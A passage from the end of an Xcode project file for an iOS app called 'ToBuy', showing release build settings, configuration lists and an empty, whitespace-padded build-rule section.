				PRODUCT_BUNDLE_IDENTIFIER = com.ToBuy.ToBuy;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		12F278F026527F1B005B6AD4 /* Build configuration list for PBXProject "ToBuy" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				12F2790726527F1C005B6AD4 /* Debug */,
				12F2790826527F1C005B6AD4 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		12F2790926527F1C005B6AD4 /* Build configuration list for PBXNativeTarget "ToBuy" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				12F2790A26527F1C005B6AD4 /* Debug */,
				12F2790B26527F1C005B6AD4 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 12F278ED26527F1B005B6AD4 /* Project object */;
}
